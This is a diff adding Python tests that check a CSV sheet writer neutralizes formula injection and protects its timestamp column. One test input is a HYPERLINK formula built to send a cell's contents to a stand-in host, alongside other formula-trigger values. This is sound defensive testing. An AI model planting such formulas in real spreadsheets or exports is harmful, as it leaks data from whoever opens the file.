@@ -83,3 +83,20 @@ def test_google_sheet_appends_with_fake_client(tmp_path: Path) -> None:
     row = client.worksheet.rows[0]
     assert row[1:] == ["cliente: Ana", "pedido: 42"]
     assert message == "Fila registrada en Google Sheets."
+
+
+def test_csv_neutralizes_formulas(tmp_path: Path) -> None:
+    CsvSheet(tmp_path / "hoja.csv").append_row(
+        {"cliente": '=HYPERLINK("http://x/?"&A1,"x")', "+campo": "-1", "nota": "@SUM(A1)"}
+    )
+    [row] = read_rows(tmp_path / "hoja.csv")
+    assert row["cliente"] == '\'=HYPERLINK("http://x/?"&A1,"x")'
+    assert row["'+campo"] == "'-1"
+    assert row["nota"] == "'@SUM(A1)"
+
+
+def test_csv_user_fecha_does_not_overwrite_timestamp(tmp_path: Path) -> None:
+    CsvSheet(tmp_path / "hoja.csv").append_row({"fecha": "falsa"})
+    [row] = read_rows(tmp_path / "hoja.csv")
+    assert row["fecha"].endswith("+00:00")
+    assert row["fecha_dato"] == "falsa"
